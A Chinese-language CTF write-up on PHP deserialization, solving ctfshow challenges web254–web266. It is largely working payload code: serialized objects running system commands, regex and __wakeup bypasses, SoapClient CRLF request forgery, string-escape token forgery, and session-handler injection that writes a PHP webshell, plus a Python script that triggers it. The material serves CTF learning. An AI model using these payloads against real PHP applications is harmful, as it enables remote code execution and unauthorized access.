文章目录)
##  简介
```php
php序列化和反序列用到两个函数
序列化：serialize,将对象格式化为一个新的字符串
反序列化：unserialize,将字符串还原为原来的对象。
一般在CTF中，可以通过自己写php代码，并传序列化后的代码，可以覆盖原来的代码，从而改变代码执行过程，达到自己的目的（仅限我的理解）
```
##  入门
```
参考：
https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163090819616780357263384%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163090819616780357263384&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-113588692.pc_v2_rank_blog_default&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450

https://blog.csdn.net/q20010619/article/details/108352029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163093042316780271566242%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163093042316780271566242&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-108352029.pc_search_result_hbase_insert&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187
```
##  反序列化中常见的魔法函数
```
__construct 当一个对象创建时被调用
__destruct 当一个对象销毁时被调用
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```
### web254
感觉和反序列化没有关系，直接通过URL参数传入，username=xxxxxx&password=xxxxxx
### web255
看代码得知，url传参数?username=xxxxxx&password=xxxxxx
并且使得属性isVip=true，才可以得到flag
所以使用unserialize，改变原来代码的isVip属性值
```php
<?php
class ctfShowUser{
    public $isVip=true;
}
echo serialize(new ctfShowUser);
```
然后用得到的字符串，写进cookie中

### web256

看代码，需要满足username和password不相同
使用unserialize去构造字符串，使两者不同
```php
<?php
class ctfShowUser{
    public $isVip=true;
    public $username='a';
}
echo serialize(new ctfShowUser);
```
### web257
看代码，跟前面几个题不相同了，需要你通过eval的命令执行来得到flag
ctfShowUser类中的__construct()和__destruct(),可以执行其他类的代码
```php
<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    private $code='system("cat f*");';
}
$b=new ctfShowUser();
echo urlencode(serialize($b));
```
#### 为什么需要用urlencode?

原因就是属性的修饰词不同，在反序列化中，private和protected都有例外
private：序列化后变量前\x00类名\x00 				protected：序列化后变量前\x00*\x00

```php
<?php
class xctf{
    private $flag = '111';
    public $a='222';
    protected $b='333';
    public function __wakeup(){
    exit('bad requests');
    }
}
$a=new xctf();
echo serialize($a.PHP_EOL);
?>
```

输出

```php
O:4:"xctf":3:{s:10:"xctfflag";s:3:"111";s:1:"a";s:3:"222";s:4:"*b";s:3:"333";}
```

这样序列化后，出现了不可见字符
所以一般需要urlencode编码，当然在本地存储耿采用base64编码

处理不可见字符

```php
1.可以使用urlencode
2.也可以将private或者protected改为public
3.或者将序列化后的字符串中，
private序列化后变量前加\x00类名\x00 		protected序列化后变量前加\x00*\x00
```

### web258

代码

```php
if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

绕过正则，在O：后面加一个+来绕过正则，且

处理不可见字符，可以将private改成public

```php
<?php
class ctfShowUser{
    public $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code='system("cat f*");';
}
$a=new ctfShowUser();
$b=serialize($a);
$b=str_replace('O:','O:+',$b);
echo urlencode($b);
```
###  web259

代码

```PHP
<?php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);

if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
?>
```

考点：[php原生类SoapClient](https://www.xiinnn.com/article/7741c455.html#SoapClient%E5%9C%A8%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8)

####  介绍

```
php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。
必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。
通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容
```

SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(*SOAP* 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用`__call`方法

具体的利用方式，上面链接有，我就不多阐述了。

同时也用到了[CRLF漏洞](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)

flag.php源码

```php
<?php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

直接构造payload

```php
<?php
$ua = "z3eyond\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow";
$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));

print_r(urlencode(serialize($client)));
```

其中content-type的需要与post的内容一致。

直接get传vip=xxx就可以了，最后访问/flag.txt应该就能拿到flag了。

###  web260

代码

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

题目意思就是你序列化出来的东西需要包含字符串ctfshow_i_love_36D，
那我们直接传ctfhsow=ctfshow_i_love_36D就可以了。

###  web261

```php
如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，
则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。
```

当反序列化时会进入__unserialize中，而且也没有什么方法可以进入到__invoke中。所以直接就朝着写文件搞就可以了

```
只要满足code==0x36d(877)就可以了。
而code是username和password拼接出来的。
所以只要username=877.php password=shell就可以了。
877.php==877是成立的（弱类型比较）
```

payload

```
<?php
class ctfshowvip{
    public $username;
    public $password;
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
}
$a=new ctfshowvip('877.php','<?php eval($_POST[1]);?>');
echo serialize($a);
```

###  web262

考查反序列化字符串逃逸。

代码

```php
<?php
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

首先看到了这一行代码，就知道了是字符串逃逸

```php
$umsg = str_replace('fuck', 'loveU', serialize($msg));
```

关于字符串逃逸，可以看看[y4的博客](https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5502)

解题思路：

访问message.php,我们看到，需要token为admin才能输出flag

```php
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

payload:

```php
<?php
class message{
   public $from;
   public $msg;
   public $to;
   public $token='admin';
   public function __construct($f,$m,$t){
       $this->from = $f;
       $this->msg = $m;
       $this->to = $t;
   }
}
$f = 1;
$m = 1;
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';
$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg ;
echo "\n";
echo base64_encode($umsg);

```

因为fuck到loveU，多了一个字符，所以属于过滤后字符增多的情况

```php
";s:5:"token";s:5:"admin";},有27个字符，所以需要27个fuck
```

然后，我们可以直接GET传参或者base64编码后的结果放到cookie里面访问message.php，就可以拿到flag

### web264

这个题跟web262不同的地方是，$_COOKIE换成 \$\_SESSION

关于两者和$_REQUEST的区别

```php
在 PHP 中，cookie 就是服务器，它是留在客户端（浏览器）上的一个小的数据文件，通常用于标识用户信息，也称为浏览器缓存或 Cookies。
$_COOKIE[] 全局数组存储了通过 HTTP COOKIE 传递到脚本的信息，PHP 可通过 setcookie() 函数设置 COOKIE 的值，用 $_COOKIE[] 数组接收 COOKIE 的值，$_COOKIE[] 数组的索引为 COOKIE 的名称。

session 是一种客户与网站（服务器）更为安全的对话方式，一旦开启了 session 会话，便可以在网站的任何页面使用（保持）这个会话，从而让访问者与网站之间建立了一种“对话”机制。但是 session 不同于 cookie，必须先启动，才能生效。
$_SESSION[] 数组用于获取会话变量的相关信息。

$_REQUEST 支持 $_GET 和 $_POST 发送过来的请求，即 get 和 post 它都可以接受，浏览器地址栏中的数据显示不显示要看传递的方法，get 会显示在 url 中（有字符限制），post 不会显示在 url 中，可以传递任意多的数据（只要服务器支持）。
默认情况下，$_REQUEST[] 数组包含了 $_GET、$_POST 和 $_COOKIE 的数组。
```

web262是cookie，所以我们可以通过直接给f，m，t赋值，然后得到base64加密后的序列化内容，然后通过cookie直接传入message.php

web264是session，直接设置在会话变量中，所以我们不能通过cookie传入了，只能在GET传入参数。

payload

```php
f=1&m=1&t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22;s:5:%22token%22;s:5:%22admin%22;}
```

同时还需要cookie传参，msg=1，访问message.php

###  web263

考点：php的session反序列化漏洞

首先扫描，发现备份文件泄露，访问www.zip得到源码，观察源码

index.php

```php
<?php
	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
?>

```

其中js代码

```js
<script>
		function check(){
			$.ajax({
			url:'check.php',
			type: 'GET',
			data:{
				'u':$('#u').val(),
				'pass':$('#pass').val()
			},
			success:function(data){
				alert(JSON.parse(data).msg);
			},
			error:function(data){
				alert(JSON.parse(data).msg);
			}

		});
		}
	</script>
```

因为index.php是把数据传入check.php,所以我们看check.php

```php
<?php
error_reporting(0);
require_once 'inc/inc.php';
$GET = array("u"=>$_GET['u'],"pass"=>$_GET['pass']);
if($GET){
	$data= $db->get('admin',
	[	'id',
		'UserName0'
	],[
		"AND"=>[
		"UserName0[=]"=>$GET['u'],
		"PassWord1[=]"=>$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破
		]
	]);
	if($data['id']){
		//登陆成功取消次数累计
		$_SESSION['limit']= 0;
		echo json_encode(array("success","msg"=>"欢迎您".$data['UserName0']));
	}else{
		//登陆失败累计次数加1
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);
		echo json_encode(array("error","msg"=>"登陆失败"));
	}
}
```

check.php，验证账号密码是否正确

访问inc.php

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('session.serialize_handler', 'php');
date_default_timezone_set("Asia/Shanghai");
session_start();
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```

看到session.serialize_handler为php，这儿就可以用到php-session反序列化

显然，`cookie`中的`limit`进行base64解码之后传入session中，之后调用`inc`中的`User`类，并且其中这个`User`类中存在文件写入函数(file_put_contents)，所以写入一句话即可，payload如下

```php
<?php
class User{
    public $username = '1.php';
    public $password = '<?php system("catflag.php");?>';
    public $status='dotast';

}
$a=new User();
echo base64_encode('|'.serialize($a));
```

```
fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozMDoiPD9waHAgc3lzdGVtKCJjYXRmbGFnLnBocCIpOz8
```

输出值存进cookie中，带着cookie去访问`index.php`，接着访问`inc/inc.php`，然后就会生成文件`log-1.php`，直接写一个脚本

```python
import requests
url = "http://a768fa0f-b2b6-47dd-a787-5b1f3063ca7e.challenge.ctf.show/"
cookies = {"PHPSESSID": "4lppepr42tnnv98rca6ei55dun", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}
res1 = requests.get(url + "index.php", cookies=cookies)

res2 = requests.get(url + "inc/inc.php", cookies=cookies)

res3 = requests.get(url + "log-1.php", cookies=cookies)
print(res3.text)
```

###  web265

考点：php的按地址传参

在C语言中，可以传地址，如果一个变量的地址赋值给另一个变量，他们的值会同时改变。

所以，利用这个特性构造payload

```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}
$a=new ctfshowAdmin(1,1);
$a->token=&$a->password;
echo serialize($a);
```

###  web266

考点：绕过大小写正则

```php
if(preg_match('/ctfshow/', $cs)) {
    throw new Exception("Error $ctfshowo",1);
}
```

正则表达式后面没有i，所以区分大小写

直接构造payload

```php
<?php
class ctfshow{
}
$a=new ctfshow();
echo serialize($a);
```

把生成的字符串里面的ctfshow改成大写的,就可以了。

对了，这个需要POST

##  补充知识点

###  php中输出打印的方式
```php
echo ,有无括号都可以，输出字符串
print，可以打印字符串
printf，类似于C语言了，%s: 按字符串;
%d: 按整型;
%b: 按二进制；
%x: 按16进制；
%o: 按八进制;
$f: 按浮点型
print_r,专门用来输出数组类型
var_dump,可以输出字符串和数组，用来调试
die，停止下面的程序执行，并输出一定的内容
参考：
https://www.jb51.net/article/91388.htm
```

